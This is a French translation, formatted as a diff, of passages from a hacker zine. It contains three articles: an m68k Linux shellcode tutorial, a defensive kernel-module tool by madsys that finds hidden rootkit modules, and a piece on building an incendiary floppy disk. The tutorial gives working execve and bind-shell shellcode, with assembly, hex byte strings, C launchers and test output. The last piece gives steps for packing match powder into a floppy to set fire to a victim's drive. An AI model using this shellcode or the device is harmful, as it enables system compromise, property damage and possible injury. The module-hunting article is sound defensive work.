+lea leal %sp@(0xc),%a0 calcule l'addresse sur 0xc pour la deplacer dans la pile
+et c'est mis à l'interieur.
+%a0.
+eor eorl %d0,%d1 xor
+pea pea 0x2f2f7368 pousse dans la pile '//sh'
+
+
+Au total ces 4 instructions sont suffisantes pour faire un shellcode. Et maintenant il est
+grand temps de parler de la 5eme et plus importante instruction (je voulais dire que nous avons besoin
+de 5 instructions) qui est lié aux exceptions. L' instruction trap - un appel d'exception.
+Dans les processeurs motorola, seulement 256 exceptions, mais toute sont [NDT:pas ?] necessaires pour nous, seulement
+trap #0 [NDT: alors la si vous comprenez ma traduction vous etes fort]. Dans les linux mc68
+cette exception appelle le kernel, pour l'execution du system call. Trap 0 est une reference
+au vecteur situé à l'adresse $80h (etrange coincidence).
+Maintenant on devrait s'arreter sur les system calls plus en détail.
+
+
+
+III. System Calls.
+
+Les system calls sur une architecture donnée sont organisées ainsi:
+
+%d0 - nombre d'un system call.
+%d1,%d2,%d3 - argv
+
+Ex: pour faire un banal setuid (0); nous aurons quelque chose sans pretention:
+
+eorl %d2,%d2
+movl %d2,%d1
+movl #23,%d0
+trap #0
+
+Plutôt simple.
+
+
+
+IV. Execve shellcode.
+
+
+Bon, nous devrions commencer comme toujours avec le vieux execve:
+
+.globl _start
+_start:
+.text
+movl #11,%d0 /* execve() (voir unistd.h) */
+movl #m1,%d1 /* adresse de /bin/sh addresse */
+movl #m2,%d2 /* NULL */
+movl #m2,%d3 /* NULL aussi */
+trap #0
+.data
+m1: .ascii "/bin/sh\0"
+m1: .ascii "0\0".
+
+# as execve.s -o execve.o ; ld execve.o -o execve
+# ./execve
+sh-2.03# exit
+exit
+#
+
+Un tel code n'ira pas dans la mesure ou il n'est pas independant de la position et
+ne le teste pas pour zero. Il est donc necessaire de le reecrire avec la participation de la
+pile (la machine etant une big endian, l'ordre des bytes necessite d'etre pris en compte)
+
+.globl _start
+_start:
+moveq #11,%d0 /* execve() */
+pea 0x2f2f7368 /* //sh */
+pea 0x2f62696e /* /bin (big endian) */
+movel %sp,%d1 /* /bin/sh dans %d1 */
+eorl %d2,%d2 /* pea 0x0 + evitement */
+movel %d2,%sp@- /* zero byte */
+pea 0x130 /* pea 0030 -> 0130 = "tue" le zero */
+movel %sp,%d2 /* NULL dans %d2 */
+movel %d2,%d3 /* NULL dans %d2 */
+trap #0 /* syscall */
+
+# as execve2.s -o execve2.o ; ld execve2.o -o execve2
+# ./execve2
+sh-2.03# exit
+exit
+#
+
+Tres bien. Nous devons maintenant le transformer en ascii et nous devrions regarder comme
+il fonctionne:
+
+
+char execve_shellcode[]=
+"\x70\x0b" /* moveq #11,%d0 */
+"\x48\x79\x2f\x2f\x73\x68" /* pea 0x2f2f7368 -> //sh */
+"\x48\x79\x2f\x62\x69\x6e" /* pea 0x2f62696e -> /bin */
+"\x22\x0f" /* movel %sp,%d1 */
+"\xb5\x82" /* eorl %d2,%d2 -> */
+"\x2f\x02" /* movel %d2,%sp@- -> pea 0x0 */
+"\x48\x78\x01\x30" /* pea 0x130 */
+"\x24\x0f" /* movel %sp,%d2 */
+"\x26\x02" /* movel %d2,%d3 */
+"\x4e\x40"; /* trap #0 */
+
+main()
+{
+int *ret;
+ret=(int *)&ret +2;
+*ret = execve_shellcode;
+}
+
+
+# gcc execve_shellcode.c -o execve_shellcode
+# ./execve_shellcode
+sh-2.03# exit
+exit
+#
+
+Notre shellcode. Parfaitement. Mais ce n'est certainement suffisant, nous devons donc
+lier ce shellcode à un socket.
+
+
+V. Shellcode Bind-socket.
+
+
+Pour le debut nous allons ecrire notre shellcode en C:
+
+#include <;;shiti;;>
+
+main()
+{
+int fd,dupa;
+struct sockaddr_in se4v;
+
+fd=socket(AF_INET,SOCK_STREAM,0);
+se4v.sin_port=200;
+se4v.sin_family=2;
+se4v.sin_addr.s_addr=0;
+
+bind(fd,(struct sockaddr *)&se4v,sizeof(se4v));
+listen(fd,1);
+dupa=accept(fd,0,0);
+dup2(dupa,0);
+dup2(dupa,1);
+dup2(dupa,2);
+execl("/bin/sh","sh",0);
+}
+
+# gcc -static bindshell.c -o bindshell &
+# ./bindshell &
+[1] 276
+# netstat -an | grep 200
+tcp 0 0 0.0.0.0:200 0.0.0.0:* LISTEN
+# telnet localhost 200
+Trying 127.0.01...
+Connected to localhost.
+Escape character is '^]'.
+echo aaaaaaaaaaaa
+aaaaaaaaaaaa
+ctrl+c
+[1]+ Done ./bindshell
+
+Tout marche. Maintenant la dernière chose qui nous interesse - il y a ici un travail
+avec le reseau
+
+# gdb -q ./bindshell
+(gdb) disas socket
+Dump of assembler code for function socket:
+0x80004734 <socket>: moveal %d2,%a0
+0x80004736 <socket+2>: moveq #102,%d0
+0x80004738 <socket+4>: moveq #1,%d1
+0x8000473a <socket+6>: lea %sp@(4),%a1
+0x8000473e <socket+10>: movel %a1,%d2
+0x80004740 <socket+12>: trap #0
+0x80004742 <socket+14>: movel %a0,%d2
+0x80004744 <socket+16>: tstl %d0
+0x80004746 <socket+18>: bmil 0x80004958 <__syscall_error>
+0x8000474c <socket+24>: rts
+0x8000474e <socket+26>: rts
+End of assembler dump.
+(gdb)
+
+Parfaitement. Comme partout ailleurs - 102 = socket_call. 1 - sys_socket.
+(pour la liste complete regarder net.h). En procedant comme dit precedemment
+nous devrions l'ecrire en assembleur:
+
+
+.globl _start
+_start:
+
+/* socket(AF_INET,SOCK_STREAM,0); ----------------------------------------- */
+/* af_inet - 2, sock_stream - 1, ip_proto0 - 0 */
+
+moveq #2,%d0
+movl %d0,%sp@ /* sock_stream */
+
+moveq #1,%d0
+movel %d0,%sp@(0x4) /* AF_INET */
+
+eorl %d0,%d0
+movl %d0,%sp@(0x8)
+
+movl %sp,%d2 /* mets dans d2 l'addresse dans la pile sur ou est notre argv*/
+
+movl #0x66,%d0 /* socketcall (asm/unistd.h) */
+movl #1,%d1 /* sys_socket (linux/net.h) */
+trap #0 /* va sur le vecteur 80 */
+
+
+/* -bind(socket,(struct sockaddr *)&serv,sizeof(serv));-------------------- */
+
+movl %d0,%sp@ /* dans d0 descripteurr sur le socket */
+
+move #200,%d0
+movl %d0,%sp@(0xc) /* Numero de port */
+
+eorl %d0,%d0
+movl %d0,%sp@(0x10) /* sin_addr.s_addr=0 */
+
+moveq #2,%d0
+movl %d0,%sp@(0x14) /* sin_family=2 */
+
+
+/* Calculons l'adresse de l'arrangement des constantes du second argument et */
+/* nous devrions mettre cette adresse comme etant le deuxième argument*/
+
+leal %sp@(0xc),%a0
+movl %a0,%sp@(0x4)
+
+moveq #0x10,%d0
+movl %d0,%sp@(0x8) /* 3eme argument 0x10 */
+
+movl #0x66,%d0 /* socketcall (asm/unistd.h) */
+movl #2,%d1 /* sys_bind (linux/net.h) */
+trap #0 /* va sur le vecteur 80 */
+
+
+/* listen (socket,1); ----------------------------------------------------- */
+/* le descripteur du socket est dejà dans la pile */
+/*------------------------------------------------------------------------- */
+moveq #1,%d0
+movl %d0,%sp@(4)
+
+/* dans d2 mets déjà les premiers arguments dans la pile*/
+
+movl #0x66,%d0 /* scoketcall (asm/unistd.h) */
+movl #4,%d1 /* sys_listen (linux/net.h) */
+trap #0 /* va sur le vecteur 80 */
+
+/* accept (fd,0,0); ------------------------------------------------------- */
+
+eorl %d0,%d0
+movl %d0,%sp@(4)
+movl %d0,%sp@(
+
+
+movl #0x66,%d0 /* scoketcall (asm/unistd.h) */
+movl #5,%d1 /* sys_accept (linux/net.h) */
+trap #0 /* va sur le vecteur 80 */
+
+/* dup2 (cli,0); ---------------------------------------------------------- */
+/* dup2 (cli,1); ---------------------------------------------------------- */
+/* dup2 (cli,2); ---------------------------------------------------------- */
+
+movl %d0,%d1
+movl #0x3f,%d0
+movl #0,%d2
+trap #0
+
+movl %d0,%d1
+movl #0x3f,%d0
+movl #1,%d2
+trap #0
+
+movl %d0,%d1
+movl #0x3f,%d0
+movl #2,%d2
+trap #0
+
+/* execve ("/bin/sh"); ----------------------------------------------------- */
+
+movl #11,%d0 /* execve */
+pea 0x2f2f7368 /* //sh */
+pea 0x2f62696e /* /bin */
+movl %sp,%d1 /* /bin/sh dans %d1 */
+
+eorl %d2,%d2
+movl %d2,%sp@- /* pea 0x0 */
+pea 0x0130 /* 0030 -> 0130 = tue le zero */
+
+movl %sp,%d2
+movl %d2,%d3
+trap #0
+
+/* ---EOF---bindsock shellcode--------------------------------------------- */
+
+
+# as bindshell.s -o bindshell.o ; ld bindshell.o -o bindshell
+# ./bindshell &
+[309]
+# telnet localhost 200
+Trying 127.0.01...
+Connected to localhost.
+Escape character is '^]'.
+echo aaaaaaaaaaaa
+aaaaaaaaaaaa
+ctrl+c
+
+En general, le code n'est certainement pas super optimisée, il y a quelque zero,
+mais l'image que je cherche à donner y est. Et a la fin voilà ce que l'on devrait avoir:
+
+
+char bind_shellcode[]=
+"\x70\x02" /* moveq #2,%d0 */
+"\x2e\x80" /* movel %d0,%sp@ */
+"\x70\x01" /* moveq #1,%d0 */
+"\x2f\x40\x00\x04" /* movel %d0,%sp@(4) */
+"\xb1\x80" /* eorl %d0,%d0 */
+"\x2f\x40\x00\x08" /* movel %d0,%sp@( */
+"\x24\x0f" /* movel %sp,%d2 */
+"\x70\x66" /* moveq #102,%d0 */
+"\x72\x01" /* moveq #1,%d1 */
+"\x4e\x40" /* trap #0 */
+"\x2e\x80" /* movel %d0,%sp@ */
+"\x30\x3c\x00\xc8" /* movew #200,%d0 */
+"\x2f\x40\x00\x0c" /* movel %d0,%sp@(12) */
+"\xb1\x80" /* eorl %d0,%d0 */
+"\x2f\x40\x00\x10" /* movel %d0,%sp@(16) */
+"\x70\x02" /* moveq #2,%d0 */
+"\x2f\x40\x00\x14" /* movel %d0,%sp@(20) */
+"\x41\xef\x00\x0c" /* lea %sp@(12),%a0 */
+"\x2f\x48\x00\x04" /* movel %a0,%sp@(4) */
+"\x70\x10" /* moveq #16,%d0 */
+"\x2f\x40\x00\x08" /* movel %d0,%sp@( */
+"\x70\x66" /* moveq #102,%d0 */
+"\x72\x02" /* moveq #2,%d1 */
+"\x4e\x40" /* trap #0 */
+"\x70\x01" /* moveq #1,%d0 */
+"\x2f\x40\x00\x04" /* movel %d0,%sp@(4) */
+"\x70\x66" /* moveq #102,%d0 */
+"\x72\x04" /* moveq #4,%d1 */
+"\x4e\x40" /* trap #0 */
+"\xb1\x80" /* eorl %d0,%d0 */
+"\x2f\x40\x00\x04" /* movel %d0,%sp@(4) */
+"\x2f\x40\x00\x08" /* movel %d0,%sp@( */
+"\x70\x66" /* moveq #102,%d0 */
+"\x72\x05" /* moveq #5,%d1 */
+"\x4e\x40" /* trap #0 */
+"\x22\x00" /* movel %d0,%d1 */
+"\x70\x3f" /* moveq #63,%d0 */
+"\x74\x00" /* moveq #0,%d2 */
+"\x4e\x40" /* trap #0 */
+"\x22\x00" /* movel %d0,%d1 */
+"\x70\x3f" /* moveq #63,%d0 */
+"\x74\x01" /* moveq #1,%d2 */
+"\x4e\x40" /* trap #0 */
+"\x22\x00" /* movel %d0,%d1 */
+"\x70\x3f" /* moveq #63,%d0 */
+"\x74\x02" /* moveq #2,%d2 */
+"\x4e\x40" /* trap #0 */
+"\x70\x0b" /* moveq #11,%d0 */
+"\x48\x79\x2f\x2f\x73\x68" /* pea 2f2f7368 */
+"\x48\x79\x2f\x62\x69\x6e" /* pea 2f62696e */
+"\x22\x0f" /* movel %sp,%d1 */
+"\xb5\x82" /* eorl %d2,%d2 */
+"\x2f\x02" /* movel %d2,%sp@- */
+"\x48\x78\x01\x30" /* pea 130 */
+"\x24\x0f" /* movel %sp,%d2 */
+"\x26\x02" /* movel %d2,%d3 */
+"\x4e\x40"; /* trap #0 */
+
+main()
+{
+int *ret;
+ret=(int *)&ret +2;
+*ret = bind_shellcode;
+}
+
+
+p.s. comme toujours- désolé pour mon mauvais anglais.
+[NDT: ouai pour ca je confirme]
+
+VI. References.
+
+[1] http://e-www.motorola.com/collateral/M68000PRM.pdf - manuel des programmeurs
+[2] http://e-www.motorola.com/brdata/PDFDB/docs/MC68060UM.pdf - manuel de l'utilisateur
+[3] http://www.lsd-pl.net/documents/asmcodes-1.0.2.pdf - bon tutorial
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 6 - Trouver des modules de kernel caché (le moyen extreme) ]=------=|
+|=-----------------------------------------------------------------------=|
+
+par madsys <madsys at ercist.iscas.ac.cn>
+
+
+1 Introduction
+2 La technique pour cacher des modules
+3 Contres mesures -- brute force
+4 Probleme du unmappé
+5 Remerciments
+6 References
+7 Code
+
+1 Introduction
+==============
+
+Cet article presente une methode qui permet de trouver des modules cachés
+dans un systeme linux. Pour parler généralement, la plupart des attaquants
+tentent de cacher leurs modules apres avoir mis leur victime à terre.
+Ils aiment ce moyen de prévenir que l'administrateur ne détecte les 
+changements de kernel. Comme les modules etaient liés à une chaine simple,
+les originaux ne pouvaient etre recuperés pendant que d'autres avaient été
+otés. Dans ce sens, il était difficile de retrouver les modules cachés.
+Des connaissances essentielles en C et des connaissances primaires du 
+kernel linux sont nécessaires.
+
+
+2 La technique de camouflage de module
+======================================
+
+Avant tout, la plus populaire et la plus générale des techniques pour 
+camoufler les modules et le [quomodo ?] des applications pour obtenir 
+les listes des modules sont examinés.
+Une implémentation des camouflages des modules sont montrés ci-dessous:
+
+
+----Coupez----
+struct module *p;
+
+for (p=&__this_module; p->next; p=p->next)
+{
+if (strcmp(p->next->name, str))
+continue;
+p->next=p->next->next; // <-- ici ca
+ote ce module
+break;
+}
+
+----Coupez----
+
+Comme vous pouvez le voir, dans le but de cacher un module, la chaine 
+unidirectionnelle a été modifié, et ce qui suis est un morceau du 
+sys_create_module() system call, qui peut indiquer pourquoi la technique 
+marchait:
+
+
+----Coupez----
+spin_lock_irqsave(&modlist_lock, flags);
+mod->next = module_list;
+module_list = mod; /* fait le lien */
+spin_unlock_irqrestore(&modlist_lock, flags);
+----Coupez----
+
+
+Une conclusion peut être faite: les modules liés à la fin de la chaine
+unidirectionelle quand ils ont été crés.
+"lsmod" est une application linux qui listent les modules presentement 
+chargés, qui utilisent les system call sys_query_module() pour obtenir la 
+liste des modules chargés, et qm_modules() est la fonction appelée par lui
+lors de la requete sur les modules:
+
+static int qm_modules(char *buf, size_t bufsize, size_t *ret)
+{
+struct module *mod;
+size_t nmod, space, len;
+
+nmod = space = 0;
+
+for (mod=module_list; mod != &kernel_module; mod=mod->next,
+++nmod) {
+len = strlen(mod->name)+1;
+if (len > bufsize)
+goto calc_space_needed;
+if (copy_to_user(buf, mod->name, len))
+return -EFAULT;
+buf += len;
+bufsize -= len;
+space += len;
+}
+
+if (put_user(nmod, ret))
+return -EFAULT;
+else
+return 0;
+
+calc_space_needed:
+space += len;
+while ((mod = mod->next) != &kernel_module)
+space += strlen(mod->name)+1;
+
+if (put_user(space, ret))
+return -EFAULT;
+else
+return -ENOSPC;
+}
+
+note: le pointeur module_list est toukours à la tête de la chaine à lien 
+unique. Celà montre clairement que la technique de camouflage de module 
+fonctionne.
+
+
+
+
+3 Contre-mesures -- brute force
+===============================
+
+D'apres la technique pour cacher le smodules, le brute force pourrait être
+utile. Le system call sys_creat_module() est expremié comme ci dessous.
+
+--Coupez--
+if ((mod = (struct module *)module_map(size)) == NULL) {
+error = -ENOMEM;
+goto err1;
+}
+--Coupez--
+
+et la macro module_map dans "asm/module.h":
+#define module_map(x) vmalloc(x)
+
+Vous devriez avoir remarqué que la fonction appelle vmalloc() pour 
+attribuer la structure du module. Ainsi, la limitation de taille de la 
+zone de vmalloc pour le brute force est capable d'être exploité pour 
+déterminer quels modules sont dans notre systeme. Comme vous le savez, la 
+zone de vmalloc est de 128M(kernel 2.2, 2.4, il y a plusieurs zones 
+d'inanition à l'intérieur), cependant tout les modules alloués devraient 
+être alignés par 4K. Donc, le nombre maximum theorique que nous sommes 
+supposé detecté etaient 128M/4k=32768.
+
+
+4 Probleme du unmappé
+=====================
+
+Jusqu'ici, peut être pensez vous: "humm, c'est tres facile de utiliser le 
+brute force pour lister ces satanés modules". Mais ce n'est pas vrai pour 
+une raison importante: il est possible que l'adresse dont vous essayer 
+d'avoir l'acces est unmappée, ainsi celà peut provoquer une faute de 
+"paging" et le kernel donnera le message:
+"Unable to handle kernel paging request at virtual address" [NDT: 
+incapable de maintenir la requete de paging du kernel a l'adresse 
+virtuelle]
+
+Ainsi, nous devons être sur que l'adresse à laquelle nous accedons est 
+mappé. La solution est de verifier la validité de l'entrée correspondante 
+dans le kernel pgd(swapper_pg_dir) et de l'entrée correpondante dans la 
+page de table. Par ailleurs, nous sommes censés nous assurer que le 
+contenu de l'adresse pointée par par le pointeur "name" (dans le moule 
+struct) etait valide. Par ce que les 768 à 1024 entrées des process 
+utilisateurs [DT: pgd ????] etaient synchronisés avec le kernel, et c'est 
+la raison pour laquelle une adresse pure et dure du kernel pgd (0xc0101000
+) a été utilisée.
+
+Ce qui suis est une fonction pour valider ces entrées dans pgd ou pgt:
+
+int valid_addr(unsigned long address)
+{
+unsigned long page;
+
+if (!address)
+return 0;
+
+page = ((unsigned long *)0xc0101000)[address >> 22];
+//pde
+if (page & 1)
+{
+page &= PAGE_MASK;
+address &= 0x003ff000;
+page = ((unsigned long *) __va(page))[address >>
+PAGE_SHIFT]; //pte
+if (page)
+return 1;
+}
+
+return 0;
+}
+
+Apres la validation de ces adresses que l'on veut verifier, l'étape
+suivante sera simple -- juste du brute force. Comme la liste des modules
+cachés a été crée, vous pourriez la comparer a avec ce que vous sort 
+"lsmod". Et ainsi vous pouvez trouver ces satanés modules et vous 
+debarrassez d'eux librement.
+
+5 Remerciments
+==============
+
+remerciements à uberhax0rs@linuxforum.net
+
+
+6 Code
+======
+
+-----BEGING MODULE_HUNTER.C-----
+/*
+* module_hunter.c: cherche des motifsf dans les espaces des adresses du kernel
+* qui ressemblent à des structures de modules. Cet outil cherche des 
+* modules cachés qui sont non reliés à l'enchainement des modules chargés.
+*
+* Cet outil est actuellement implenté comme un module mais peut facilement
+* etre porté a une application utilisateur (avec /dev/kmem).
+*
+* Compiler avec: gcc -c module_hunter.c -I/usr/src/linux/include
+* insmod ./module_hunter.o
+*
+* usage: cat /proc/showmodules && dmesg
+*/
+
+#define MODULE
+#define __KERNEL__
+
+#include <linux/config.h>
+
+#ifdef CONFIG_SMP
+#define __SMP__
+#endif
+
+#ifdef CONFIG_MODVERSIONS
+#define MODVERSIONS
+#include <linux/modversions.h>
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/version.h>
+
+#include <linux/unistd.h>
+#include <linux/string.h>
+
+
+#include <linux/proc_fs.h>
+
+#include <linux/errno.h>
+#include <asm/uaccess.h>
+
+
+#include <asm/pgtable.h>
+#include <asm/fixmap.h>
+#include <asm/page.h>
+
+static int errno;
+
+
+int valid_addr(unsigned long address)
+{
+unsigned long page;
+
+if (!address)
+return 0;
+
+page = ((unsigned long *)0xc0101000)[address >> 22];
+
+if (page & 1)
+{
+page &= PAGE_MASK;
+address &= 0x003ff000;
+page = ((unsigned long *) __va(page))[address >> PAGE_SHIFT]; //pte
+if (page)
+return 1;
+}
+
+return 0;
+}
+
+ssize_t
+showmodule_read(struct file *unused_file, char *buffer, size_t len, loff_t *off)
+{
+struct module *p;
+
+printk("address module\n\n");
+for (p=(struct module *)VMALLOC_START; p<=(struct \
+module*)(VMALLOC_START+VMALLOC_RESERVE-PAGE_SIZE); p=(struct module \
+*)((unsigned long)p+PAGE_SIZE))
+{
+if (valid_addr((unsigned long)p+ (unsigned long)&((struct \
+module *)NULL)->name) && valid_addr(*(unsigned long *)((unsigned long)p+ \
+(unsigned long)&((struct module *)NULL)->name)) && strlen(p->name))
+if (*p->name>=0x21 && *p->name<=0x7e && (p->size < 1 <<20))
+printk("0x%p%20s size: 0x%x\n", p, p->name, p->size);
+}
+
+return 0;
+}
+
+static struct file_operations showmodules_ops = {
+read: showmodule_read,
+};
+
+int init_module(int x)
+{
+struct proc_dir_entry *entry;
+
+entry = create_proc_entry("showmodules", S_IRUSR, &proc_root);
+entry->proc_fops = &showmodules_ops;
+
+return 0;
+}
+
+void cleanup_module()
+{
+remove_proc_entry("showmodules", &proc_root);
+}
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("madsys<at>ercist.iscas.ac.cn");
+-----END MODULE-HUNTER.C-----
+
+
+|=-----------------------------------------------------------------------=|
+|=-=[ 7 - Les Bonne vieilles disquette bombe ]=--------------------------=|
+|=-----------------------------------------------------------------------=|
+
+[ Note des éditeurs: Nous pensons que le temp est venu de
+re-publize quelques techniques de pyro, qui on était oublié Enjoy. ]
+
+##########################################
+# Comment faire une disquette explosives #
+# par Phrick-A-Phrack                    #
+##########################################
+
+
+Comment faire une disquette explosive
+Par Phrick-A-Phrack
+
+Avant de commencer je voudrais dire clairement que je ne prendrais
+aucune responsabilitée quand aux utilisation des informations ici présente
+
+Ce petit bébé est pas mal pour bourrer un peu l'ordinateur de quelqu'un.
+Il peut être utile pour toute une plage d'autre choses.
+
+Vous aurez besoin:
+
+- D'une disquette (C'est une bonne idée d'utiliser des disquettes
+3,5 pouces.
+- D'une paire de ciseau
+- Des alumettes domestique blanches ou bleues (je ne sais pas pourquoi mais
+il semblerais que celà ne fonctionne pas avec les autres couleurs)
+- Du vernis a ongle.
+
+Que faut il maintenant faire:
+
+-Ouvrir delicatement la disquette.
+-Oter le coton recouvrant la partie interne.
+-Racler de la poudre d'alumette dans un recipient.
+(utiliser un ustensile en bois et non un objet en metal
+qui serait susceptible d'enflammer la poudre)
+(NDT: Le traducteur conclu ainsi a la lecture de ce commentaire, que les 
+alumettes dit "de sureté" (a grattoir au phosphore) ne fonctionneront pas
+pour cette manipulation, Et qu'il faut dans ce cas precis prendre ces 
+vieilles alummettes qui s'allumment en les frottant sur n'importe quelle 
+surface rugueuse)
+-Laisser couler du vernis a ongle sur la poudre d'alumette prealablement
+ repartie dans la disquette.
+-Laisser secher.
+-Refermer la disquette avec beaucoup de precaution, en utilisant un peu de 
+ vernis a ongle pour la refermer.
+
+Comment utiliser la disquette:
+
+Donner à la personne à laquelle vous avez envie "d'arranger l'ordinateur".
+Dites lui que ce qui est sur la disquette pourrait l'interesser.
+Quant la personne essaye d'inserer la disquette celà provoque un petit feu,
+suffisant pour faire fondre le lecteur et la tete de lecture.
+
+
+   ^^Phrick-A-Phrack^^ 
